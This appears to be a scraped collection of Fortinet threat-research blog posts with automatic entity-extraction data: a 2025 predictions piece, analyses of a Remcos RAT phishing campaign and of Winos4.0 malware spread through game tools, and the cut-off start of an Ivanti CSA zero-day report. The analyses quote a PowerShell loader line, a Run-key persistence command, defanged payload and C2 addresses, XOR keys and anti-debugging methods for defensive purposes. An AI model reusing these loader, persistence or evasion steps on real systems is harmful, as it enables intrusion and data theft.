    "content": "FortiGuard Labs Threat Research While threat actors continue to rely on many “classic” tactics that have existed for decades, our threat predictions for the coming year largely focus on cybercriminals embracing bigger, bolder, and, from their perspectives, better attacks. From Cybercrime-as-a-Service (CaaS) groups becoming more specialized to adversaries using sophisticated playbooks that combine both digital and physical threats, cybercriminals are upping the ante to execute more targeted and harmful attacks. In our2025 threat predictions report, our FortiGuard Labs team looks at tried-and-true attacks cybercriminals continue to rely on and how these have evolved, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations worldwide can enhance their resilience in the face of a changing threat landscape. As cybercrime evolves, we anticipate seeing several unique trends emerge in 2025 and beyond. Here’s a glimpse of what we expect. Cybercriminals will always find new ways to infiltrate organizations. Yet there are numerous opportunities for the cybersecurity community to collaborate to better anticipate adversaries’ next moves and interrupt their activities in a meaningful way. The value of industrywide efforts and public-private partnerships cannot be overstated, and we anticipate that the number of organizations participating in these collaborations will grow in the coming years. Additionally, organizations must remember that cybersecurity is everyone’s job, not just the responsibility of the security and IT teams. For example, implementing enterprisewide security awareness and training is a vital component of managing risk. And finally, other entities have a responsibility to promote and adhere to robust cybersecurity practices, ranging from governments to the vendors that manufacture the security products we rely on. No single organization or security team can disrupt cybercrime alone. By working together and sharing intelligence across the industry, we’re collectively better positioned to fight against adversaries and effectively protect society. Download a copy of ourfull predictions report for 2025. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio.Sign up for FortiGuard Outbreak Alertsto stay up to speed on the latest breaking threats. Learn more about Fortinet’sfree cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda, or about the FortinetNetwork Security Expert program,Academic Partner program, andVeterans program. derek manky Business and Technology Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Company), (Threat Research, Topic), (Cybercrime-as-a-Service, Threat Type), (CaaS, Threat Type), (adversaries, Attacker), (Sophisticated Playbook, Technique), (digital threats, Threat Type), (physical threats, Threat Type), (Cybersecurity Community, Organization), (Collaboration, Relationship), (public-private partnerships, Relationship), (organizations, Organization), (resilience, Topic)\nRelationships: (FortiGuard Labs, publishes, 2025 threat predictions report), (FortiGuard Labs, anticipates, several unique trends), (FortiGuard Labs, collaborates with, cybersecurity community), (FortiGuard Labs, works with, public-private partnerships), (cybersecurity community, participates in, collaboration), (public-private partnerships, involve, organizations), (organizations, participate in, collaboration)",
      "entities": [
        [
          "FortiGuard Labs",
          "Company"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "Cybercrime-as-a-Service",
          "Threat Type"
        ],
        [
          "CaaS",
          "Threat Type"
        ],
        [
          "adversaries",
          "Attacker"
        ],
        [
          "Sophisticated Playbook",
          "Technique"
        ],
        [
          "digital threats",
          "Threat Type"
        ],
        [
          "physical threats",
          "Threat Type"
        ],
        [
          "Cybersecurity Community",
          "Organization"
        ],
        [
          "Collaboration",
          "Relationship"
        ],
        [
          "public-private partnerships",
          "Relationship"
        ],
        [
          "organizations",
          "Organization"
        ],
        [
          "resilience",
          "Topic"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 threat predictions report"
        ],
        [
          "FortiGuard Labs",
          "anticipates",
          "several unique trends"
        ],
        [
          "FortiGuard Labs",
          "collaborates with",
          "cybersecurity community"
        ],
        [
          "FortiGuard Labs",
          "works with",
          "public-private partnerships"
        ],
        [
          "cybersecurity community",
          "participates in",
          "collaboration"
        ],
        [
          "public-private partnerships",
          "involve",
          "organizations"
        ],
        [
          "organizations",
          "participate in",
          "collaboration"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 7
  },
  {
    "title": "New Campaign Uses Remcos RAT to Exploit Victims",
    "link": "https://www.fortinet.com/blog/threat-research/new-campaign-uses-remcos-rat-to-exploit-victims",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control a victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently noticed a phishing campaign in the wild. It is initialized with a phishing email containing a malicious Excel document. Upon researching the campaign, I found it was spreading a new variant of the Remcos RAT. Remcos is a commercial RAT (remote administration tool) sold online. It provides purchases with a wide range of advanced features to remotely control computers belonging to the buyer. However, threat actors have abused Remcos to collect sensitive information from victims and remotely control their computers to perform further malicious acts. Figure 1 displays the Remcos webpage. In this security blog, I will show how Remcos is delivered to a victim’s device, what kinds of anti-analysis techniques it leverages to protect itself from being analyzed, how this variant of Remcos is deployed, how it achieves persistence on the victim’s device, and what advanced features Remcos provides to remotely control a victim’s device. The phishing email is shown in Figure 2. It contains an attached malicious Excel file disguised as an order file to convince the recipient to open the document. CVE-2017-0199is a Remote Code Execution vulnerability that exploits how Microsoft Office and WordPad parse specially crafted files. Once the recipient opens the attached file, the MS Excel program shows the file content, as seen in Figure 3. In the background, the CVE-2017-0199 vulnerability is exploited to download an HTA file and execute it on the recipient’s device. As you may know, a crafted embedded OLE object leads to this vulnerability. Figure 4 demonstrates the content of the crafted embedded OLE object (“\\x01Ole”). MS Excel program accesses the short URL “hxxps://og1[.]in/2Rxzb3.” It is then redirected to another URL, “hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.hta”. The download packet, shown in Figure 5, is a Wireshark screenshot. The HTA file is an HTML Application file. It is executed by a Windows-native application (mshta.exe) called by MS Excel using DCOM components. Its code is wrapped in multiple layers using different script languages and encoding methods, including JavaScript, VBScript, Base64-encoded, URL-encoded, and PowerShell, to protect itself from detection and analysis. Figure 6 shows some script code examples. These are executed when the downloaded HTA file is parsed in mshta.exe. Take a look at the Powershell code at the bottom of Figure 6. It calls the API URLDownloadToFile() to download an EXE file from the URL “hxxp://192[.]3[.]220[.]22/430/dllhost.exe” into a local file, “%AppData%\\dllhost.exe.” Executing “STaRt $EnV: APPDATA\\dllhost.exe” starts the downloaded EXE file on the victim’s device. Once the downloaded EXE file, dllhost.exe, starts, it extracts a batch of files into the %AppData% folder. Figure 7 is a screenshot of the extracted files and sub-folders located in %AppData%\\intercessionate\\Favourablies117\\sulfonylurea. Some of the key data are hidden in these files. dllhost.exe then runs the PowerShell program by calling the API CreateProcessW() to execute a piece of PowerShell code, as illustrated in Figure 8. Since dllhost.exe is a 32-bit process, it runs a 32-bit PowerShell, “C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe.” This is important because the malicious code only works on the 32-bit PowerShell process. The PowerShell code breaks down as follows. $krjning=Get-Content -Raw '%AppData% \\intercessionate\\Favourablies117\\sulfonylurea\\Aerognosy.Res';$Lukewarmly95=$krjning.SubString(5322,3);.$Lukewarmly95($krjning) It reads the content of “Aerognosy.Res,” an extracted file, into a local variable “$krjning,” which is full of PowerShell script. “iEx” is the return value of SubString(5322,3), which is short for an Invoke-Expression used to run a string as a command or expression.  Finally, “iEx” executes the entire PowerShell script (“Aerognosy.Res”) after calling “.$Lukewarmly95($krjning).” Again, the PowerShell code is thoroughly obfuscated and encoded. Based on my research on the code, I discovered it performs the following functions: As I mentioned, the copied malicious code relies on a 32-bit version of PowerShell. It first runs a piece of self-decryption code mixed with a huge amount of useless instructions, creating a big challenge for analysts. Figure 10 presents the end of the decrypting code, where it is about to execute the “call edi” instruction. The EDI register now points to the decrypted code, as shown on the right. It leverages numerous complicated anti-analysis techniques to protect itself from being analyzed. 1.  It installs a vectored exception handler. Whenever an exception occurs, the exception handler is called to handle it. The exception code provides corresponding ways to restore the code to resume from another offset. There are numerous exception instructions inside the malicious code. In other words, this strategy drives the entire code. Figure 11 shows an instruction that can raise an exception (0x8000003) at 0xEE16222, which the exception handler will then capture and handle. The exception handler function also checks the DR registers (Debug Registers), which are Dr0, Dr1, Dr2, Dr3, Dr4, Dr5, Dr6, and Dr7. Their values are not 0 when a debugger is present. 2.  System APIs are dynamically gained and called in a unique way. There are no API name constant strings in the code. Instead, it keeps the hash codes of the API names. Whenever it calls an API, it uses a unique function that retrieves the API information from the PEB, which is pointed to by fs:[30h] to get their function address by matching the name’s hash code. This raises the difficulty of performing static analysis. In addition, it has another function that is called every time an API is called. This function detects if the debugger has set the API breakpoint. It also encrypts the code from the caller’s return address to the base address, which cleans up the code just executed. 3.  It is called ZwSetInformationThread(), and it performs anti-debugging. The malicious code calls API ZwSetInformationThread() with the argument  ThreadHideFromDebugger (0x11) and the current thread (0xFFFFFFFE). This mechanism in Windows can conceal a thread’s existence from debuggers. Figure 12 illustrates how it calls this API with the associated arguments. If a debugger is attached to the current process, it exits immediately once the API is called. 4.  It checks the result value of API ZwQueryInformationProcess(). It calls API ZwQueryInformationProcess() with the ProcessDebugPort (7) argument to detect if the debugPort is set (non-zero value). If yes, this means a debugger is attached to the current process (PowerShell.exe). 5.  All the constant values are gained at run time. Please refer to the code snippet below to see how it splits “mov ebx 100h” into three instructions. 6.  It uses an API hooking technique for several APIs. The malicious code simulates executing multiple API instructions (say, two instructions) at the beginning and then jumps to the API to execute the rest of the instructions (beginning with the 3rd instruction). Below is an example for CreateProcessInternalW(). The highlighted codes are simulated, which can invalidate any API breakpoints. Whenever any of the above detection conditions are triggered, the current process (PowerShell.exe) can become unresponsive, crash, or exit unexpectedly. The malicious code performs process hollowing to put itself into a newly created Vaccinerende.exe process (copied from dllhost.exe). To do this, it calls the API CreateProcessInternalW() with CreatFlags of CREATE_SUSPENDED (0x4), which will suspend the new process after it is created. It then calls some related APIs to transfer all the malicious code to the new process and run it. The relevant APIs are NtAllocateVirtualMemory(), ZwCreateSection(), NtMapViewOfSection(), NtGetContextThread(),  NtSetContextThread(), and NtResumeThread(). It performs all the anti-analysis detections described in the above section and then uses a workflow different from the PowerShell process. According to my research, it finishes some tasks, like maintaining persistence, downloading and decrypting the Remcos payload execution, and starting the downloaded Remcos in memory. The malicious code adds a new auto-run item to the system registry to maintain persistence and maintain control of the victim’s device when it is restarted. Figure 14 shows the malicious code as it is about to run the REG (reg.exe) process to add the auto-run item and how it appears in the Registry Editor. It calls the API ShellExecuteW() to run cmd.exe with a command line string of /c REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Chivey57\" /t REG_EXPAND_SZ /d \"%Misbehavers% -windowstyle 1 $Frligheden=(gp -Path 'HKCU:\\Software\\Roscoelite\\').Aftvttedes;%Misbehavers% ($Frligheden).\" “%Misbehavers%” has been defined as the full path to the 32-bit PowerShell.exe in the system environment. It reads a piece of PowerShell code, which is the same as the PowerShell code that dllhost.exe executes, from a string value called “Aftvttedes” in the system registry. Next, the malicious code downloads an encrypted file from the URL “hxxp[:]//192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.bin.”  The file contains the encrypted Remcos malware. To download the file, some relevant APIs, like InternetOpenA(), InternetOpenUrlA(), and InternetReadFile(), are called in a row. After decrypting the downloaded file, I found a new variant of Remcos. Rather than saving the Remcos file into a local file and running it, it directly deploys Remcos in the current process's memory (Vaccinerende.exe). In other words, it is a fileless variant of Remcos. It then starts Remcos on a thread, where the thread function (StartAddress) is the entry point. To start the thread, it calls an undocumented API, NtCreateThreadEx(). Figure 15 shows a screenshot of the debugger as it is about to call the API to start Remcos. Each Remcos variant has a setting block with a batch of configurations that control how Remcos operates on the victim’s device. The setting block is encrypted and saved in the Resource section named “SETTINGS,” which gets decrypted at the start and initializes Remcos with the setting block. Look at Figure 16 to examine the decrypted setting block in memory. The setting block has 57 values in total, which are separated by “\\x7C\\x1E\\x1E\\x1F\\x7C”, as illustrated in Figure 16. The values in the setting block are retrieved by their index, from 0 to 56, through a special function. The setting values tell Remcos how to do its work on the victim’s device, including the C&C server IP address and port, Remcos’ name, Remcos’ mutex name (also registry key name), a Remcos license number, the keylogger’s local log file, a couple of certificates used to verify and communicate with the C&C server, and several switch flags indicating if a feature is enabled or disabled, such as Keylogger, Screenshot, Watchdog, Record audios, Reset browsers’ login, and more. The C&C server IP&Port string at index 0 is “107[.]173[.]4[.]16:2404:1,” where “107[.]173[.]4[.]16” is the IP address, “2404” is the TCP port, and the last “1” means that it enables TLS to communicate with the C&C server. Remcos collects some basic information from the victim’s device. It then encrypts and sends the collected data to its C&C server to register that the victim’s device is online and ready to be controlled. This is the first command packet sent to the C&C server. The memory dump data in Figure 17 shows the content of the register packet (command ID 4Bh) that is about to be encrypted. When TLS is enabled (as set in the settings block), packets follow the same structure, whether sending or receiving. These packets consist ofPacket Magic(like 0xFF0424) +Command Data Size(like 0x2C6) +Command ID(like 0x4B) +Command Data+Packet Type(like 0x17, 0x16, and 0x15). I will break down the command data of the 4B to explain what basic information Remcos collects from the victim’s device. The command data has many separators (“\\x7C\\x1E\\x1E\\x1F\\x7C”) to separate the collected basic information. After registering the victim’s device on the C&C server, it receives a control command packet from the server to perform further work on the victim’s device. These features and corresponding commands are detailed below. This example of control command 06h asks Remcos to obtain all running process lists from the victim’s device. Remcos sends a 4Fh command packet with the collected process list consisting of the process name, PID, architecture (64bit or 32bit), and the full path, as shown in Figure 18. Figure 19 is a screenshot of the C&C server view of the process list. Remcos includes a function that parses the received control command data from the server and then performs the corresponding action on the victim’s device. My analysis of this function shows that Remcos has the features and commands listed in the following chart. In this analysis, I walked through the entire process of the phishing campaign. It begins with a phishing email with an attached OLE Excel document. This disguised email is used to trick the recipient into opening the attached Excel document. The CVE-2017-0199 vulnerability is exploited once the Excel file is opened on the victim’s device. It then downloads an HTA file and executes it on the device. Multiple script languages are leveraged to download an EXE file (dllhost.exe), which then starts the 32-bit PowerShell process to load the malicious code from extracted files and execute it in the PowerShell process. Next, I explained what anti-analysis techniques are used in the code, such as a vectored exception handler, dynamically gained APIs, dynamically calculated constant numbers, the APIs ZwSetInformationThread() and ZwQueryInformationProcess(), and API hooking. After passing the detections introduced in the anti-analysis part, it performs process hollowing to run the malicious code in the new process “Vaccinerende.exe,” which not only ensures persistence on the victim’s device but also downloads and decrypts the Remcos payload file. I then elaborated on how it keeps Remcos in memory and starts its entry point function in a thread (API NtCreateThreadEx()). Subsequently, I explained how Remcos works with its setting block on the victim’s device, how Remcos communicates with its C&C server, and what the format of the traffic packet looks like. Finally, I focused on introducing the features this Remcos variant can perform on the victim’s device and listing the relevant control commands for each feature. Figure 20 shows the entire process of the phishing campaign. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions offers advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS.Office.OLE.autolink.Code.Execution”. FortiGuard Antivirus servicedetects the original Excel document, the HTA file, the downloaded executable file, the data/script files and the Recom executable file with the following AV signatures. MSExcel/CVE-2017-0199.REM!exploitJS/Remcos.CB!tr.dldrPowerShell/Remcos.SER!trData/Remcos.LAV!trW32/Remcos.LD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://og1[.]in/2Rxzb3hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.htahxxp://192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.binhxxp://192[.]3[.]220[.]22/430/dllhost.exe 107[.]173[.]4[.]16:2404 [PO-9987689987.xls]4A670E3D4B8481CED88C74458FEC448A0FE40064AB2B1B00A289AB504015E944 [cookienetbookinetcahce.hta]F99757C98007DA241258AE12EC0FD5083F0475A993CA6309811263AAD17D4661 [dllhost.exe / Vaccinerende.exe]9124D7696D2B94E7959933C3F7A8F68E61A5CE29CD5934A4D0379C2193B126BE [Aerognosy.Res]D4D98FDBE306D61986BED62340744554E0A288C5A804ED5C924F66885CBF3514 [Valvulate.Cru]F9B744D0223EFE3C01C94D526881A95523C2F5E457F03774DD1D661944E60852 [Remcos / Decrypted hFXELFSwRHRwqbE214.bin]24A4EBF1DE71F332F38DE69BAF2DA3019A87D45129411AD4F7D3EA48F506119D rat FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Remcos, Malware), (Microsoft Office, Tool), (WordPad, Tool), (CVE-2017-0199, Vulnerability), (Figure 1, Image), (Figure 2, Image)\\nRelationships: (FortiGuard Labs, notices, phishing campaign), (phishing campaign, spreads, Remcos), (Remcos, isDeliveredTo, victim's device), (victim's device, employs, anti-analysis techniques), (remotesControl, achievedBy, persistence mechanism), (persistence mechanism, provides, advancedFeatures), (advancedFeatures, provide, remoteControl), (phishing email, contains, maliciousExcelfile), (maliciousExcelfile, isAttackedBy, MS Excel program), (MS Excel program, executes, codeExecutionvulnerability)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Remcos",
          "Malware"
        ],
        [
          "Microsoft Office",
          "Tool"
        ],
        [
          "WordPad",
          "Tool"
        ],
        [
          "CVE-2017-0199",
          "Vulnerability"
        ],
        [
          "Figure 1",
          "Image"
        ],
        [
          "Figure 2",
          "Image"
        ],
        [
          "FortiGuard Labs",
          "notices",
          "phishing campaign"
        ],
        [
          "phishing campaign",
          "spreads",
          "Remcos"
        ],
        [
          "Remcos",
          "isDeliveredTo",
          "victim's device"
        ],
        [
          "victim's device",
          "employs",
          "anti-analysis techniques"
        ],
        [
          "remotesControl",
          "achievedBy",
          "persistence mechanism"
        ],
        [
          "persistence mechanism",
          "provides",
          "advancedFeatures"
        ],
        [
          "advancedFeatures",
          "provide",
          "remoteControl"
        ],
        [
          "phishing email",
          "contains",
          "maliciousExcelfile"
        ],
        [
          "maliciousExcelfile",
          "isAttackedBy",
          "MS Excel program"
        ],
        [
          "MS Excel program",
          "executes",
          "codeExecutionvulnerability"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 0
  },
  {
    "title": "Threat Campaign Spreads Winos4.0 Through Game Application",
    "link": "https://www.fortinet.com/blog/threat-research/threat-campaign-spreads-winos4-through-game-application",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:Medium Winos4.0 is an advanced malicious framework that offers comprehensive functionality, a stable architecture, and efficient control over numerous online endpoints to execute further actions. Rebuilt from Gh0strat, it includes several modular components, each handling distinct functions. Winos4.0 has been deployed in various attack campaigns, such as Silver Fox. FortiGuard Labs has identified multiple samples of this malware hidden within gaming-related applications, including installation tools, speed boosters, and optimization utilities. Analysis of the decoded DLL file reveals a potential targeting of the education sector, as indicated by its file description, “校园政务” (Campus Administration). In this blog post, we will delve into a comprehensive technical analysis of a campaign that leveraged these applications to deliver Winos4.0. Initial access is achieved by distributing game-related applications designed for optimization or installation. After the victim runs the application, it retrieves a fake BMP file from the server ad59t82g[.]com. The file is then XOR decoded, extracting the DLL “you.dll,” which is loaded through its export function “you” to proceed to the next stage. This DLL file is responsible for setting up the execution environment. It begins by downloading three files from the same remote path “hxxp://ad59t82g[.]com/1/” used in the previous stage. A folder with a random name is then created in “C:\\Program Files (x86),” where” text.bmp” is saved as “t3d.tmp,” “d.bmp” as “t4d.tmp,” and “t2.bmp” as “t5d.tmp.” It then extracts “t3d.tmp” using the password “lalala123%,” obtaining three clean files: u72kOdQ.exe, MSVCP140.dll, and VCRUNTIME140.dll. Next, it decodes “t4d.tmp” with XOR key 0x67080000 to reveal the main malicious file, “libcef.dll.” The purpose of the three extracted files is to load “libcef.dll” to inject shellcode. The DLL is named “学籍系统,” meaning “Student Registration System,” suggesting that the threat actor may be targeting educational organizations. Next, It checks for the presence of a window with the specific class name “Q360SafeMonClass.” If the window is not found, it proceeds to establish persistence by adding the executable “u72kOdQ.exe” to the registry key “SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN” under the name “WINDOWS.” It then loads the “Shell32” library and calls “ShellExecuteA” to execute u72kOdQ.exe. If the window “Q360SafeMonClass” is present, it transfers to setting a scheduled task. It downloads another encoded file, “hxxp://ad59t82g[.]com/1/h[.]bmp.” The XOR-decoded result is an MSIL file embedded with a Base64-encoded command. The decoded command intends to create a scheduled task named “Window Defender Uqdata” that executes a specified command (execute “u72kOdQ.exe”) starting one minute from the current time, with a repetition interval of one minute and configured to restart up to three times if necessary. The task runs with the highest privileges (RunLevel 1). Following the persistence setup, the malicious DLL “libcef.dll” decodes “t5d.tmp” using an XOR key 0x67080000. Once decoded, it injects the extracted shellcode, preparing it to execute actions within the compromised environment. The shellcode dynamically loads APIs, as shown in Figure 13. The shellcode retrieves configuration data by searching for the marker string “codecode,” a change from the previous version, which used the string “codemark” for this purpose. The malware retrieves the C2 address 202[.]79[.]173[.]4 and port 80, establishing a connection using the TCP protocol (t1:1). It sends “x32” to the C2 for module downloading, which serves to check in the victim. The downloaded module consists of encrypted data with a size of 0x4B00E. The data is decrypted using a simple XOR operation with the key value of 0x2B. The decrypted 32-bit module is “上线模块.dll.” It is then executed, leading to the next stage. The modules described in the following sections are all components of Winos4.0. They facilitate online functionality, including logging in and checking in with the server. Additionally, they enable the retrieval of C2 commands and downloading modules. The entry first calls a function to check whether the value of the registry key “HKEY_CURRENT_USER\\\\Console\\\\IpDate” is valid. This value will later be used to update the main server address in the subsequent payload downloaded via C2. Once it confirms that it can reach the C2 server, it then downloads encoded data from its C2. It saves the XOR-decoded results in the registry “HKEY_CURRENT_USER \\\\Console\\\\0\\\\ d33f351a4aeea5e608853d1a56661059.” Once the module is configured for the next stage, the C2 server address information is recorded in the registry key “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IpDates_info.” This module is responsible for information collection, environment checks, and core backdoor functionality. Its functions include: During this campaign's attack, we retrieved two plugins from the command and control (C2) server, which are stored in the registry under the key “HKEY_CURRENT_USER\\\\Console\\\\0.” These modules are specifically designed to capture screenshots and manage documents. Upon receiving directives from the C2 server, these plugins facilitate uploading documents from the compromised system, enabling the attacker to gather sensitive information and discreetly monitor activities. Winos4.0 is a powerful framework, similar to Cobalt Strike and Sliver, that can support multiple functions and easily control compromised systems. Threat campaigns leverage Game-related applications to lure a victim to download and execute the malware without caution and successfully deploy deep control of the system. The entire attack chain involves multiple encrypted data and lots of C2 communication to complete the injection. Users should be aware of any new application's source and only download the software from qualified sources. The malware described in this report is detected and blocked byFortiGuard Antivirusas: W32/Agent.HUJ!tr.dldrW32/Agent.NJD!trData/Agent.3A23!trW32/Agent.501F!trMSIL/Agent.93AB!trW32/Agent.DCO!trW32/Agent.SS!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs. We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://ad59t82g[.]com/1/lon2[.]bmphxxp://ad59t82g[.]com/1/text[.]bmphxxp://ad59t82g[.]com/1/d[.]bmphxxp://ad59t82g[.]com/1/t2[.]bmphxxp://ad59t82g[.]com/1/h[.]bmp ad59t82g[.]com202[.]79[.]173[.]4 c9817d415d34ea3ae07094dae818ffe8e3fb1d5bcb13eb0e65fd361b7859eda7 NetDiagnotor.exe (天谕客户端检测工具)284cf31ebb4e7dc827374934ad0726f72e7aaef49cadc6aa59d2a2ff672d3fe8 gpatchex.exe (梦幻西游更新程序)b2a3aaf4eb4deb85462e1ee39c84caf2830091c1bff8014ad13147897b25e24c Duoyi (战盟安装程序)b763d77b7aaa83d6c4a9e749cd3c7638127e755d3dc843b15b6c4afce1f468b5 劲舞团联合登录器.exe (窗口化)dcdbc3b246233befa25b67909a01b835f1875f4047875ef13f1b801cd2da6fcd Duoyi (战盟安装程序)3fae0495fd0acc7722c2482c0ef3c6ab9ee41acbcaac46a8933c7b36b8896378 crashreporter.exef41236ab5ceffc5379fcf444de358cbc6f67beb31d0e0fd3f7ed0f501eb740ff yxqxunyou.exe (英雄联盟优化)80b1d6411e29e51e54f20f46856d31b28e087e9244693e65d022b680c4ba00ce 劲舞团联合登录器.exe (窗口化)1a48347f5fc7c63cc03f30810f961133bd3912caf16ac403e11bc3491117181d manualupdate.exe (天谕手动更新工具)8748bb7512f16f8122779171686abe0fa0060f1126298290e240457dc90d0aa7 MatRepair.exe (反恐行动客户端修复程序)1354796b44239eef177431584848029161c232401a9580481dbfb5196465250e you.dllbef32532923903b12f04b54dd06ec81661f706c3b1397bc77c45492db3919248 you.dll033965f3063bc2a45e5bd3a57ffce098b9308668d70b9b3063f066df5f3e55dd you.dll922512203c7b9fa67e8db2f588ff4945f63e20c4bc0aafccdba749a442808ace you.dll04edb6585118d09205ee693a54249ed68ebbf68b3fc3d711d2aa0c815b7b3a23 shellcode51c7f320b95a64bcff050da86c7884bb4f89a5d00073d747f0da7345c8a4501f 学籍系统.dllff0c28c81cd0afd78f78c79863c9f4c8afd9d3877a213dfc2dbb55360b7d93ab ConsoleApp2.exea27dc6e5aea0c3168117cfde2adb01f73f20881fc6485b768915216c46115064 差异屏幕.vll8f0079a41a262536f502b4b57473effd6ab7955bc2d6e99e0910df18e990a9f6 文件管理.vll37104f3b3646f5ffc8c78778ec5fdc924ebb5e5756cb162c0e409d24bedf406d 上线模块.dll (online module)a30b68ed39c1517d10b747c2fcd7a72cb12dc8f434203243e7c50df0e56d17d0 登录模块.dll (login module) Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Winos4.0, Malware), (ad59t82g[.]com, Domain), (you.dll, File), (you, Function)\\nRelationships: (FortiGuard Labs, affectedPlatforms, Microsoft Windows), (Winos4.0, uses, ad59t82g[.]com), (Winos4.0, contains, you.dll), (Winos4.0, exports, you)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Winos4.0",
          "Malware"
        ],
        [
          "ad59t82g[.]com",
          "Domain"
        ],
        [
          "you.dll",
          "File"
        ],
        [
          "you",
          "Function"
        ],
        [
          "FortiGuard Labs",
          "affectedPlatforms",
          "Microsoft Windows"
        ],
        [
          "Winos4.0",
          "uses",
          "ad59t82g[.]com"
        ],
        [
          "Winos4.0",
          "contains",
          "you.dll"
        ],
        [
          "Winos4.0",
          "exports",
          "you"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 0
  },
  {
    "title": "Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA",
    "link": "https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Ivanti Cloud Services Appliance version 4.6 and priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical Today FortiGuard Labs is releasing this blog post about a case where an advanced adversary was observed exploiting three vulnerabilities affecting the Ivanti Cloud Services Appliance (CSA). At the time of our investigation, two out of the three identified vulnerabilities were not publicly known. This incident is a prime example of how threat actors chain zero-day vulnerabilities to gain initial access to a victim’s network. In a recent incident response engagement, FortiGuard Incident Response (FGIR) services were engaged by a customer to investigate malicious communication originating from their network. During the investigation, FGIR came across an adversary who had gained access to the customer’s network by exploiting the CVE-2024-8190 and two previously unknown vulnerabilities affecting the PHP front end of the Ivanti CSA appliance. The incident was detected by the customer on September 9, 2024, when some of its internal systems were found to be communicating to a malicious IP address,206[.]189[.]156[.]69. FGIR was engaged the next day. During the IR investigation, FGIR observed that the threat actor exploited the vulnerability CVE-2024-8190 in conjunction with the following two previously publicly unknown vulnerabilities: These resources are located under the root folder of the PHP web front, which serves as the management console of the CSA. On September 19, 2024, FGIR disclosed to Ivanti’s security team the discovery of the two new vulnerabilities. During the meeting, the Ivanti team claimed that they were aware and tracking the two publicly unknown exploited vulnerabilities. On September 19, Ivanti published the advisory for CVE-2024-8963, which addressed the path traversal vulnerability. On September 10, 2024, at 14:00:02, Ivanti published the security advisoryCVE-2024-8190on their forum. The advisory informed about the discovery of an authenticated command injection vulnerability in theDateTimeTab.phpresource, affecting CSA 4.6 with patch 518 and earlier versions. On September 13, 2024, the CVE-2024-8190 vulnerability was added to the CISA’s Known Exploited Vulnerabilities list. On the same date, Ivanti updated their security advisory to mention that, following public disclosure of the September 10th, exploitation of the command injection vulnerability had been observed in the wild. On September 16, 2024, the research team at Horizon3.ai publishedthe detailsrelated to the CVE-2024-8190 vulnerability and also released a proof of concept exploit code. During the incident response investigation, FGIR observed that the threat actor exploited a path traversal vulnerability on the resource/client/index.phpto gain unauthorized authenticated access to the resource/gsb/users.phpby sending the following web request: The first of such 